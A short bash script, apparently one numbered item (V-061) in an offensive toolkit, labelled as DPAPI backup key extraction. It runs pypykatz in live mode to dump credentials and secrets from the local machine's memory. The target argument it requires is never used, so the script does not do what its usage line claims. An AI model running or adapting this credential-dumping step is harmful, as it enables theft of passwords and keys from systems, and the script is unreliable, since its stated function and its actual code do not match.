#!/bin/bash
# V-061 -- DPAPI backup key extraction
# Tool: pypykatz
# Usage: bash V-061.sh <target> <session_output_dir>

TARGET="${1:?Usage: V-061.sh <target> <session_output_dir>}"
SESSION_DIR="${2:-}"

echo "DPAPI extraction"; pypykatz live 2>&1 | head -30
exit $?
